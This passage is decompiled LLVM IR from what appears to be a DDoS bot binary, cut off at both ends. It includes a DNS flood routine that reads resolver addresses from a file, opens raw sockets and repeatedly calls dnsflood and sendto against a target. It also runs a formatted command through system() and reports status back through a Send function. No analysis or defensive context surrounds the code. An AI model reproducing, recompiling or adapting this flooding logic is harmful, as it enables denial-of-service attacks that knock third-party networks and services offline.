  %v1_acf0 = trunc i32 %v1_ace0 to i16
  store i16 %v1_acf0, i16* %v5_a578, align 4
  %v3_ad04 = load i16, i16* %v4_a4ec, align 2
  %div72 = udiv i16 %v3_ad04, 2
  %v3_ad08 = zext i16 %div72 to i32
  %v3_ad1c = call i32 @csum(i16* %v2_a8cc, i32 %v3_ad08)
  %sext18 = mul i32 %v3_ad1c, 65536
  %v1_ad20 = sdiv i32 %sext18, 65536
  %v1_ad2c = trunc i32 %v1_ad20 to i16
  store i16 %v1_ad2c, i16* %v4_a53c, align 2
  br label %dec_label_pc_ad3c

dec_label_pc_ad3c:                                ; preds = %dec_label_pc_a90c, %dec_label_pc_ad3c
  %storemerge1920 = phi i32 [ 0, %dec_label_pc_a90c ], [ %v1_ad7c, %dec_label_pc_ad3c ]
  %v3_ad40 = load i16, i16* %v4_a4ec, align 2
  %v4_ad40 = zext i16 %v3_ad40 to i32
  %v6_ad74 = call i32 @sendto(i32 %v3_a410, i32 %v2_a44c, i32 %v4_ad40, i32 0, i32 %v3_a910, i32 16)
  %v1_ad7c = add nuw nsw i32 %storemerge1920, 1
  %v7_ad8c = icmp slt i32 %v1_ad7c, 25
  br i1 %v7_ad8c, label %dec_label_pc_ad3c, label %dec_label_pc_ad90

dec_label_pc_ad90:                                ; preds = %dec_label_pc_ad3c
  %v1_ac40 = add i32 %v3_a9b8, 16
  %v1_ad94 = add i32 %stack_var_-32.1, 1
  br label %dec_label_pc_a8f0

dec_label_pc_ada0:                                ; preds = %entry
  %v2_ada4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_ada4, i32* @fp, align 4
  ret i32 %v0_a3a0

; uselistorder directives
  uselistorder i32 %v1_ac1c, { 1, 0 }
  uselistorder i32 %v3_a9b8, { 12, 11, 13, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 14 }
  uselistorder i32 %v3_a910, { 0, 2, 3, 1 }
  uselistorder i32 %stack_var_-28.0, { 1, 0 }
  uselistorder i32 %v2_a44c, { 34, 0, 12, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 22, 23, 13, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 14, 15, 16, 17, 18, 19, 20, 21, 35 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-4164, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ad3c, { 1, 0 }
  uselistorder label %dec_label_pc_a90c, { 1, 0 }
  uselistorder label %dec_label_pc_a430, { 1, 0 }
}

define i32 @ParseResolverLine(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-580 = alloca i8*, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-68 = alloca i8*, align 4
  %stack_var_-1091 = alloca i32, align 4
  %stack_var_-579 = alloca i32, align 4
  %stack_var_-67 = alloca i32, align 4
  %stack_var_-1104 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_adb4 = load i32, i32* @r4, align 4
  %v6_adb4 = load i32, i32* @fp, align 4
  store i32 44476, i32* %stack_var_-4, align 4
  %v2_adb8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_adb8, i32* @fp, align 4
  store i32 %arg2, i32* %stack_var_-1104, align 4
  %v2_add0 = load i8, i8* bitcast (i8** @global_var_37000.155 to i8*), align 4
  %v3_add0 = zext i8 %v2_add0 to i32
  %v6_add4 = inttoptr i32 %v3_add0 to i8*
  store i8* %v6_add4, i8** %stack_var_-68, align 4
  %v2_add8 = ptrtoint i32* %stack_var_-67 to i32
  store i32 31, i32* @r2, align 4
  store i32 %v2_add8, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  %v0_ade8 = call i32 @__GI_memset()
  store i8* %v6_add4, i8** %stack_var_-580, align 4
  %v2_adfc = ptrtoint i32* %stack_var_-579 to i32
  store i32 511, i32* @r2, align 4
  store i32 %v2_adfc, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  %v0_ae10 = call i32 @__GI_memset()
  %v2_ae28 = ptrtoint i32* %stack_var_-1091 to i32
  store i32 511, i32* @r2, align 4
  store i32 %v2_ae28, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  %v0_ae3c = call i32 @__GI_memset()
  store i32 %v0_ae3c, i32* %r0.global-to-local, align 4
  %v2_aec4 = ptrtoint i8** %stack_var_-68 to i32
  %tmp27 = bitcast i8** %stack_var_-68 to i8*
  %v2_aee8 = ptrtoint i32* %stack_var_-24 to i32
  %v2_af0c = ptrtoint i8** %stack_var_-580 to i32
  %tmp28 = bitcast i8** %stack_var_-580 to i8*
  %v2_af38 = add i32 %v2_aee8, -556
  %v2_aeec = add i32 %v2_aee8, -44
  br label %dec_label_pc_af54

dec_label_pc_ae54:                                ; preds = %dec_label_pc_af54
  %v2_ae60 = add i32 %storemerge3, %tmp
  %v1_ae64 = inttoptr i32 %v2_ae60 to i8*
  %v2_ae64 = load i8, i8* %v1_ae64, align 1
  %v7_ae68 = icmp eq i8 %v2_ae64, 32
  br i1 %v7_ae68, label %dec_label_pc_aea8, label %dec_label_pc_ae70

dec_label_pc_ae70:                                ; preds = %dec_label_pc_ae54
  %v2_ae80 = load i8, i8* %v1_ae64, align 1
  %v7_ae84 = icmp eq i8 %v2_ae80, 10
  br i1 %v7_ae84, label %dec_label_pc_aea8, label %dec_label_pc_ae8c

dec_label_pc_ae8c:                                ; preds = %dec_label_pc_ae70
  %v2_ae9c = load i8, i8* %v1_ae64, align 1
  %v7_aea0 = icmp eq i8 %v2_ae9c, 9
  br i1 %v7_aea0, label %dec_label_pc_aea8, label %dec_label_pc_aeb8

dec_label_pc_aea8:                                ; preds = %dec_label_pc_ae8c, %dec_label_pc_ae70, %dec_label_pc_ae54
  %v1_aeac = add i32 %stack_var_-32.1, 1
  br label %dec_label_pc_af48

dec_label_pc_aeb8:                                ; preds = %dec_label_pc_ae8c
  %v2_aebc = icmp eq i32 %stack_var_-32.1, 0
  br i1 %v2_aebc, label %dec_label_pc_aec4, label %dec_label_pc_af00

dec_label_pc_aec4:                                ; preds = %dec_label_pc_aeb8
  store i32 %v2_aec4, i32* %r0.global-to-local, align 4
  %v3_aecc = call i32 @strlen(i8* %tmp27)
  store i32 %v3_aecc, i32* %r0.global-to-local, align 4
  %v2_aee0 = load i8, i8* %v1_ae64, align 1
  %v2_aef0 = add i32 %v2_aeec, %v3_aecc
  %v3_aef8 = inttoptr i32 %v2_aef0 to i8*
  store i8 %v2_aee0, i8* %v3_aef8, align 1
  br label %dec_label_pc_af48

dec_label_pc_af00:                                ; preds = %dec_label_pc_aeb8
  %v7_af04 = icmp eq i32 %stack_var_-32.1, 1
  br i1 %v7_af04, label %dec_label_pc_af0c, label %dec_label_pc_af48

dec_label_pc_af0c:                                ; preds = %dec_label_pc_af00
  store i32 %v2_af0c, i32* %r0.global-to-local, align 4
  %v3_af14 = call i32 @strlen(i8* %tmp28)
  store i32 %v3_af14, i32* %r0.global-to-local, align 4
  %v2_af28 = load i8, i8* %v1_ae64, align 1
  %v2_af3c = add i32 %v2_af38, %v3_af14
  %v3_af44 = inttoptr i32 %v2_af3c to i8*
  store i8 %v2_af28, i8* %v3_af44, align 1
  br label %dec_label_pc_af48

dec_label_pc_af48:                                ; preds = %dec_label_pc_af00, %dec_label_pc_aec4, %dec_label_pc_aea8, %dec_label_pc_af0c
  %stack_var_-32.0 = phi i32 [ %v1_aeac, %dec_label_pc_aea8 ], [ 0, %dec_label_pc_aec4 ], [ 1, %dec_label_pc_af0c ], [ %stack_var_-32.1, %dec_label_pc_af00 ]
  %v1_af4c = add i32 %storemerge3, 1
  br label %dec_label_pc_af54

dec_label_pc_af54:                                ; preds = %entry, %dec_label_pc_af48
  %stack_var_-32.1 = phi i32 [ 0, %entry ], [ %stack_var_-32.0, %dec_label_pc_af48 ]
  %storemerge3 = phi i32 [ 0, %entry ], [ %v1_af4c, %dec_label_pc_af48 ]
  store i32 %storemerge3, i32* @r4, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_af5c = call i32 @strlen(i8* %arg1)
  store i32 %v3_af5c, i32* %r0.global-to-local, align 4
  %v0_af64 = load i32, i32* @r4, align 4
  %v3_af64 = icmp ult i32 %v0_af64, %v3_af5c
  br i1 %v3_af64, label %dec_label_pc_ae54, label %dec_label_pc_af6c

dec_label_pc_af6c:                                ; preds = %dec_label_pc_af54
  %v2_af70 = load i32, i32* @global_var_536c4.157, align 4
  %v2_af74 = icmp eq i32 %v2_af70, 0
  store i32 540, i32* %r0.global-to-local, align 4
  %v1_af80 = call i32 @malloc(i32 540)
  store i32 %v1_af80, i32* %r0.global-to-local, align 4
  br i1 %v2_af74, label %dec_label_pc_af7c, label %dec_label_pc_b034

dec_label_pc_af7c:                                ; preds = %dec_label_pc_af6c
  store i32 %v1_af80, i32* @global_var_536c4.157, align 4
  store i32 %v1_af80, i32* @r0, align 4
  %v2_afa4 = call i32 @bzero(i32 %v1_af80, i32 16)
  %v2_afac = load i32, i32* @global_var_536c4.157, align 4
  store i32 %v2_afac, i32* @r4, align 4
  store i32 %v2_aec4, i32* @r0, align 4
  %v1_afb8 = call i32 @inet_addr(i32 %v2_aec4)
  %v1_afc0 = load i32, i32* @r4, align 4
  %v2_afc0 = add i32 %v1_afc0, 4
  %v3_afc0 = inttoptr i32 %v2_afc0 to i32*
  store i32 %v1_afb8, i32* %v3_afc0, align 4
  %v2_afc8 = load i32, i32* @global_var_536c4.157, align 4
  store i32 53, i32* %r0.global-to-local, align 4
  %v1_afd0 = call i32 @__GI_htons(i32 53)
  %v1_afd8 = trunc i32 %v1_afd0 to i16
  %v3_afd8 = add i32 %v2_afc8, 2
  %v4_afd8 = inttoptr i32 %v3_afd8 to i16*
  store i16 %v1_afd8, i16* %v4_afd8, align 2
  %v2_afe0 = load i32, i32* @global_var_536c4.157, align 4
  %v1_afe4 = add i32 %v2_afe0, 16
  store i32 %v1_afe4, i32* %r0.global-to-local, align 4
  store i32 %v2_af0c, i32* @r1, align 4
  %v2_aff4 = inttoptr i32 %v1_afe4 to i8*
  %v3_aff4 = call i32 @strcpy(i8* %v2_aff4, i32 %v2_af0c)
  store i32 %v3_aff4, i32* %r0.global-to-local, align 4
  %v2_affc = load i32, i32* @global_var_536c4.157, align 4
  %v3_b000 = load i32, i32* %stack_var_-1104, align 4
  %v2_b004 = add i32 %v2_affc, 528
  %v3_b004 = inttoptr i32 %v2_b004 to i32*
  store i32 %v3_b000, i32* %v3_b004, align 4
  %v2_b00c = load i32, i32* @global_var_536c4.157, align 4
  %v2_b018 = add i32 %v2_b00c, 532
  %v3_b018 = inttoptr i32 %v2_b018 to i32*
  store i32 %v2_b00c, i32* %v3_b018, align 4
  %v2_b020 = load i32, i32* @global_var_536c4.157, align 4
  %v2_b02c = add i32 %v2_b020, 536
  %v3_b02c = inttoptr i32 %v2_b02c to i32*
  store i32 %v2_b020, i32* %v3_b02c, align 4
  br label %dec_label_pc_b0e0

dec_label_pc_b034:                                ; preds = %dec_label_pc_af6c
  store i32 %v1_af80, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 540, i32* @r2, align 4
  %v0_b050 = call i32 @__GI_memset()
  store i32 %v2_aec4, i32* @r0, align 4
  %v1_b05c = call i32 @inet_addr(i32 %v2_aec4)
  %v2_b068 = add i32 %v1_af80, 4
  %v3_b068 = inttoptr i32 %v2_b068 to i32*
  store i32 %v1_b05c, i32* %v3_b068, align 4
  store i32 53, i32* %r0.global-to-local, align 4
  %v1_b070 = call i32 @__GI_htons(i32 53)
  %v1_b080 = trunc i32 %v1_b070 to i16
  %v3_b080 = add i32 %v1_af80, 2
  %v4_b080 = inttoptr i32 %v3_b080 to i16*
  store i16 %v1_b080, i16* %v4_b080, align 2
  %v1_b088 = add i32 %v1_af80, 16
  store i32 %v1_b088, i32* %r0.global-to-local, align 4
  store i32 %v2_af0c, i32* @r1, align 4
  %v2_b098 = inttoptr i32 %v1_b088 to i8*
  %v3_b098 = call i32 @strcpy(i8* %v2_b098, i32 %v2_af0c)
  store i32 %v3_b098, i32* %r0.global-to-local, align 4
  %v2_b0a0 = load i32, i32* @global_var_536c4.157, align 4
  %v2_b0a8 = add i32 %v1_af80, 536
  %v3_b0a8 = inttoptr i32 %v2_b0a8 to i32*
  store i32 %v2_b0a0, i32* %v3_b0a8, align 4
  %v2_b0b0 = load i32, i32* @global_var_536c4.157, align 4
  %v3_b0b4 = load i32, i32* %stack_var_-1104, align 4
  %v2_b0b8 = add i32 %v2_b0b0, 528
  %v3_b0b8 = inttoptr i32 %v2_b0b8 to i32*
  store i32 %v3_b0b4, i32* %v3_b0b8, align 4
  %v2_b0c0 = load i32, i32* @global_var_536c4.157, align 4
  %v1_b0c4 = add i32 %v2_b0c0, 532
  %v2_b0c4 = inttoptr i32 %v1_b0c4 to i32*
  %v3_b0c4 = load i32, i32* %v2_b0c4, align 4
  %v2_b0cc = add i32 %v1_af80, 532
  %v3_b0cc = inttoptr i32 %v2_b0cc to i32*
  store i32 %v3_b0c4, i32* %v3_b0cc, align 4
  %v2_b0d4 = load i32, i32* @global_var_536c4.157, align 4
  %v2_b0dc = add i32 %v2_b0d4, 532
  %v3_b0dc = inttoptr i32 %v2_b0dc to i32*
  store i32 %v1_af80, i32* %v3_b0dc, align 4
  br label %dec_label_pc_b0e0

dec_label_pc_b0e0:                                ; preds = %dec_label_pc_af7c, %dec_label_pc_b034
  store i32 %v3_adb4, i32* @r4, align 4
  store i32 %v6_adb4, i32* @fp, align 4
  %v1_b0e8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_b0e8

; uselistorder directives
  uselistorder i32 %v2_b020, { 1, 0 }
  uselistorder i32 %v2_b00c, { 1, 0 }
  uselistorder i32 %storemerge3, { 2, 0, 1 }
  uselistorder i32 %stack_var_-32.1, { 3, 2, 1, 0 }
  uselistorder i32 %v2_af0c, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v2_aec4, { 2, 3, 0, 1, 4 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 5, 2, 1, 3, 6, 4, 7, 9, 8, 15, 14, 11, 10, 13, 12, 16, 0 }
  uselistorder i32 53, { 1, 4, 2, 5, 0, 3 }
  uselistorder label %dec_label_pc_b0e0, { 1, 0 }
  uselistorder label %dec_label_pc_af54, { 1, 0 }
  uselistorder label %dec_label_pc_af48, { 3, 0, 1, 2 }
}

define i32 @dns(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-1375 = alloca i32, align 4
  %stack_var_-1119 = alloca i32, align 4
  %stack_var_-1088 = alloca i32, align 4
  %stack_var_-1432 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_b0f4 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_b0f4, i32* %ip.global-to-local, align 4
  store i32 45312, i32* %stack_var_-4, align 4
  %v2_b0fc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_b0fc, i32* @fp, align 4
  %v2_b104 = ptrtoint i32* %stack_var_-1432 to i32
  store i32 %v2_b104, i32* %r3.global-to-local, align 4
  %v1_b124 = call i32 @mfork(i32 %arg2)
  store i32 %v1_b124, i32* %r3.global-to-local, align 4
  %v2_b12c = icmp eq i32 %v1_b124, 0
  br i1 %v2_b12c, label %dec_label_pc_b134, label %dec_label_pc_b56c

dec_label_pc_b134:                                ; preds = %entry
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 255, i32* %r2.global-to-local, align 4
  %v3_b140 = call i32 @socket(i32 2, i32 3, i32 255)
  store i32 %v3_b140, i32* %r3.global-to-local, align 4
  %v1_b150 = icmp slt i32 %v3_b140, 0
  br i1 %v1_b150, label %dec_label_pc_b158, label %dec_label_pc_b160

dec_label_pc_b158:                                ; preds = %dec_label_pc_b134
  %v1_b15c = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_b160

dec_label_pc_b160:                                ; preds = %dec_label_pc_b134, %dec_label_pc_b158
  store i32 %arg3, i32* %r3.global-to-local, align 4
  %v8_b168 = icmp sgt i32 %arg3, 4
  br i1 %v8_b168, label %dec_label_pc_b18c, label %dec_label_pc_b16c

dec_label_pc_b16c:                                ; preds = %dec_label_pc_b160
  %v2_b170 = load i32, i32* @global_var_52598.39, align 4
  store i32 %v2_b170, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([67 x i8]* @global_var_37020.160 to i32), i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_b180 = call i32 @Send(i32 %v2_b170, i32 ptrtoint ([67 x i8]* @global_var_37020.160 to i32))
  %v1_b188 = call i32 @__GI_exit(i32 -1)
  br label %dec_label_pc_b18c

dec_label_pc_b18c:                                ; preds = %dec_label_pc_b160, %dec_label_pc_b16c
  %v1_b190 = add i32 %arg4, 12
  store i32 %v1_b190, i32* %r3.global-to-local, align 4
  %v1_b194 = inttoptr i32 %v1_b190 to i32*
  %v2_b194 = load i32, i32* %v1_b194, align 4
  store i32 %v2_b194, i32* %r3.global-to-local, align 4
  %v1_b198 = inttoptr i32 %v2_b194 to i8*
  %v3_b19c = call i32 @strlen(i8* %v1_b198)
  %v2_b1ac = mul i32 %v3_b19c, 5
  %v1_b1b0 = add i32 %v2_b1ac, 160
  store i32 %v1_b1b0, i32* %r2.global-to-local, align 4
  store i32 1023, i32* %r3.global-to-local, align 4
  %v8_b1c8 = icmp sgt i32 %v1_b1b0, 1023
  br i1 %v8_b1c8, label %dec_label_pc_b56c, label %dec_label_pc_b1cc

dec_label_pc_b1cc:                                ; preds = %dec_label_pc_b18c
  store i32 %v1_b1b0, i32* %ip.global-to-local, align 4
  store i32 %v1_b190, i32* %r3.global-to-local, align 4
  %v2_b1d8 = load i32, i32* %v1_b194, align 4
  store i32 %v2_b1d8, i32* @lr, align 4
  store i32 %v1_b190, i32* %r3.global-to-local, align 4
  %v2_b1e4 = load i32, i32* %v1_b194, align 4
  store i32 %v2_b1e4, i32* @r4, align 4
  store i32 %v1_b190, i32* %r3.global-to-local, align 4
  %v2_b1f0 = load i32, i32* %v1_b194, align 4
  store i32 %v2_b1f0, i32* %r2.global-to-local, align 4
  store i32 %v1_b190, i32* %r3.global-to-local, align 4
  %v2_b1fc = load i32, i32* %v1_b194, align 4
  %v2_b214 = ptrtoint i32* %stack_var_-1088 to i32
  store i32 %v2_b1e4, i32* %stack_var_-1432, align 4
  store i32 %v2_b214, i32* @r0, align 4
  store i32 %v1_b1b0, i32* @r1, align 4
  store i32 ptrtoint ([171 x i8]* @global_var_37064.162 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_b1d8, i32* %r3.global-to-local, align 4
  %v8_b238 = call i32 @__GI_snprintf(i32 %v2_b214, i32 %v1_b1b0, i32 ptrtoint ([171 x i8]* @global_var_37064.162 to i32), i32 %v2_b1d8, i32 %v2_b1e4, i32 %v2_b1f0, i32 %v2_b1fc)
  store i32 %v2_b214, i32* %r3.global-to-local, align 4
  %v1_b24c = call i32 @system(i32 %v2_b214)
  store i32 ptrtoint (i32* @global_var_536c4.157 to i32), i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @global_var_536c4.157, align 4
  %v1_b260 = call i32 @malloc(i32 256)
  store i32 %v1_b260, i32* %r3.global-to-local, align 4
  store i32 %v1_b260, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 256, i32* @r2, align 4
  %v0_b278 = call i32 @__GI_memset()
  %v2_b298 = ptrtoint i32* %stack_var_-1119 to i32
  store i32 %v2_b298, i32* %r3.global-to-local, align 4
  store i32 31, i32* @r2, align 4
  store i32 %v2_b298, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  %v0_b2a8 = call i32 @__GI_memset()
  %v2_b2c0 = ptrtoint i32* %stack_var_-1375 to i32
  store i32 %v2_b2c0, i32* %r3.global-to-local, align 4
  store i32 255, i32* @r2, align 4
  store i32 %v2_b2c0, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  %v0_b2d0 = call i32 @__GI_memset()
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_37110.166 to i32), i32* @r0, align 4
  store i32 ptrtoint ([2 x i8]* @global_var_37118.168 to i32), i32* @r1, align 4
  %v3_b2e4 = call i32 @__GI_fopen(i32 ptrtoint ([8 x i8]* @global_var_37110.166 to i32), i32 ptrtoint ([2 x i8]* @global_var_37118.168 to i32))
  %v2_b2fc = inttoptr i32 %v0_b278 to i8*
  br label %dec_label_pc_b30c

dec_label_pc_b2f4:                                ; preds = %dec_label_pc_b30c
  store i32 %stack_var_-48.0, i32* %r1.global-to-local, align 4
  %v3_b2fc = call i32 @ParseResolverLine(i8* %v2_b2fc, i32 %stack_var_-48.0)
  %v1_b304 = add i32 %stack_var_-48.0, 1
  br label %dec_label_pc_b30c

dec_label_pc_b30c:                                ; preds = %dec_label_pc_b1cc, %dec_label_pc_b2f4
  %storemerge = phi i32 [ %v3_b2e4, %dec_label_pc_b1cc ], [ %v1_b304, %dec_label_pc_b2f4 ]
  %stack_var_-48.0 = phi i32 [ 0, %dec_label_pc_b1cc ], [ %v1_b304, %dec_label_pc_b2f4 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  store i32 256, i32* %r1.global-to-local, align 4
  store i32 %v3_b2e4, i32* %r2.global-to-local, align 4
  %v3_b318 = call i32 @fgets(i32 %v0_b278, i32 256, i32 %v3_b2e4)
  store i32 %v3_b318, i32* %r3.global-to-local, align 4
  %v2_b320 = icmp eq i32 %v3_b318, 0
  br i1 %v2_b320, label %dec_label_pc_b328, label %dec_label_pc_b2f4

dec_label_pc_b328:                                ; preds = %dec_label_pc_b30c
  %v1_b334 = add i32 %arg4, 16
  store i32 %v1_b334, i32* %r3.global-to-local, align 4
  %v1_b338 = inttoptr i32 %v1_b334 to i32*
  %v2_b338 = load i32, i32* %v1_b338, align 4
  store i32 %v2_b338, i32* %r3.global-to-local, align 4
  store i32 %v2_b338, i32* @r0, align 4
  %v1_b340 = call i32 @atol(i32 %v2_b338)
  %v2_b350 = load i32, i32* @global_var_536c4.157, align 4
  store i32 %v2_b350, i32* %r3.global-to-local, align 4
  %v1_b354 = add i32 %v2_b350, 532
  %v2_b354 = inttoptr i32 %v1_b354 to i32*
  %v3_b354 = load i32, i32* %v2_b354, align 4
  store i32 -1368, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v2_b368 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_b368, i32* %r1.global-to-local, align 4
  %v1_b374 = call i32 @__GI_htons(i32 0)
  %sext = mul i32 %v1_b374, 65536
  %v1_b378 = sdiv i32 %sext, 65536
  store i32 %v1_b378, i32* %r2.global-to-local, align 4
  store i32 %v2_b368, i32* %r1.global-to-local, align 4
  %v1_b394 = add i32 %arg4, 4
  store i32 %v1_b394, i32* %r3.global-to-local, align 4
  %v1_b398 = inttoptr i32 %v1_b394 to i32*
  %v2_b398 = load i32, i32* %v1_b398, align 4
  store i32 %v2_b398, i32* %r3.global-to-local, align 4
  store i32 %v2_b398, i32* @r0, align 4
  %v1_b3a0 = call i32 @inet_addr(i32 %v2_b398)
  %v2_b3b8 = mul i32 %v1_b340, 28
  %v1_b3c0 = add i32 %v2_b3b8, 14
  %v3_b3c4 = and i32 %v1_b3c0, -8
  %v1_b3cc = load i32, i32* @sp, align 4
  %v2_b3cc = sub i32 %v1_b3cc, %v3_b3c4
  %v1_b3d0 = add i32 %v2_b3cc, 16
  store i32 %v1_b3d0, i32* %r1.global-to-local, align 4
  %v1_b3dc = add i32 %v2_b3cc, 23
  %v3_b3e0 = and i32 %v1_b3dc, -8
  store i32 %v3_b3e0, i32* %r2.global-to-local, align 4
  %v1_b3f8 = add i32 %arg4, 8
  store i32 %v1_b3f8, i32* %r3.global-to-local, align 4
  %v1_b3fc = inttoptr i32 %v1_b3f8 to i32*
  %v2_b3fc = load i32, i32* %v1_b3fc, align 4
  store i32 %v2_b3fc, i32* %r3.global-to-local, align 4
  store i32 %v2_b3fc, i32* @r0, align 4
  %v1_b404 = call i32 @atol(i32 %v2_b3fc)
  %v2_b454 = add i32 %v3_b3e0, 8
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %v1_b340, i32* %r3.global-to-local, align 4
  %v5_b4fc52 = icmp sgt i32 %v1_b340, 0
  br i1 %v5_b4fc52, label %dec_label_pc_b41c, label %dec_label_pc_b500

dec_label_pc_b41c:                                ; preds = %dec_label_pc_b328, %dec_label_pc_b41c
  %storemerge153 = phi i32 [ %v1_b4e8, %dec_label_pc_b41c ], [ 0, %dec_label_pc_b328 ]
  %v3_b424 = mul i32 %storemerge153, 4
  %v2_b42c = mul i32 %storemerge153, 28
  %v2_b430 = add i32 %v2_b42c, %v3_b3e0
  %v2_b438 = inttoptr i32 %v2_b430 to i32*
  store i32 %storemerge153, i32* %v2_b438, align 4
  %v2_b458 = add i32 %v2_b454, %v2_b42c
  store i32 %v2_b458, i32* %ip.global-to-local, align 4
  store i32 %v1_b3a0, i32* %r1.global-to-local, align 4
  %v1_b470 = inttoptr i32 %v2_b458 to i32*
  store i32 2, i32* %v1_b470, align 4
  %v3_b470 = add i32 %v2_b458, 4
  %v4_b470 = inttoptr i32 %v3_b470 to i32*
  %v5_b470 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_b470, i32* %v4_b470, align 4
  %v6_b470 = add i32 %v2_b458, 8
  %v7_b470 = inttoptr i32 %v6_b470 to i32*
  %v8_b470 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_b470, i32* %v7_b470, align 4
  %v9_b470 = add i32 %v2_b458, 12
  %v10_b470 = inttoptr i32 %v9_b470 to i32*
  %v11_b470 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_b470, i32* %v10_b470, align 4
  %v2_b490 = add i32 %v2_b430, 4
  %v2_b498 = inttoptr i32 %v2_b490 to i32*
  store i32 %v3_b354, i32* %v2_b498, align 4
  %v2_b4b8 = add i32 %v2_b430, 24
  %v2_b4c0 = inttoptr i32 %v2_b4b8 to i32*
  store i32 %v1_b404, i32* %v2_b4c0, align 4
  store i32 %v3_b3e0, i32* %r1.global-to-local, align 4
  store i32 %v3_b424, i32* %r2.global-to-local, align 4
  store i32 %v2_b430, i32* %r3.global-to-local, align 4
  %v3_b4e0 = call i32 @dnsflood(i32 %v2_b430, i32 %v3_b3e0, i32 %v3_b424)
  %v1_b4e8 = add nuw nsw i32 %storemerge153, 1
  store i32 %v1_b4e8, i32* %r2.global-to-local, align 4
  store i32 %v1_b340, i32* %r3.global-to-local, align 4
  %v5_b4fc = icmp slt i32 %v1_b4e8, %v1_b340
  br i1 %v5_b4fc, label %dec_label_pc_b41c, label %dec_label_pc_b500

dec_label_pc_b500:                                ; preds = %dec_label_pc_b41c, %dec_label_pc_b328
  %v2_b504 = load i32, i32* @global_var_52598.39, align 4
  store i32 %v2_b504, i32* %r2.global-to-local, align 4
  store i32 %v1_b394, i32* %r3.global-to-local, align 4
  %v2_b510 = load i32, i32* %v1_b398, align 4
  store i32 %v2_b510, i32* %ip.global-to-local, align 4
  store i32 %v1_b3f8, i32* %r3.global-to-local, align 4
  %v2_b51c = load i32, i32* %v1_b3fc, align 4
  %v1_b520 = load i32, i32* @sp, align 4
  %v2_b520 = inttoptr i32 %v1_b520 to i32*
  store i32 %v2_b51c, i32* %v2_b520, align 4
  %v0_b524 = load i32, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([36 x i8]* @global_var_3711c.170 to i32), i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* @r2, align 4
  %v0_b530 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_b530, i32* %r3.global-to-local, align 4
  %v3_b534 = call i32 @Send(i32 %v0_b524, i32 ptrtoint ([36 x i8]* @global_var_3711c.170 to i32))
  store i32 %arg3, i32* %r3.global-to-local, align 4
  %v7_b540 = icmp slt i32 %arg3, 5
  br i1 %v7_b540, label %dec_label_pc_b564, label %dec_label_pc_b544

dec_label_pc_b544:                                ; preds = %dec_label_pc_b500
  %v1_b548 = add i32 %arg4, 20
  store i32 %v1_b548, i32* %r3.global-to-local, align 4
  %v1_b54c = inttoptr i32 %v1_b548 to i32*
  %v2_b54c = load i32, i32* %v1_b54c, align 4
  store i32 %v2_b54c, i32* %r3.global-to-local, align 4
  store i32 %v2_b54c, i32* @r0, align 4
  %v1_b554 = call i32 @atol(i32 %v2_b54c)
  store i32 %v1_b554, i32* %r3.global-to-local, align 4
  %v1_b560 = call i32 @sleep(i32 %v1_b554)
  br label %dec_label_pc_b564

dec_label_pc_b564:                                ; preds = %dec_label_pc_b500, %dec_label_pc_b544
  %v1_b568 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_b56c

dec_label_pc_b56c:                                ; preds = %entry, %dec_label_pc_b18c, %dec_label_pc_b564
  %v1_b578 = phi i32 [ %v1_b124, %entry ], [ %v3_b19c, %dec_label_pc_b18c ], [ %v1_b568, %dec_label_pc_b564 ]
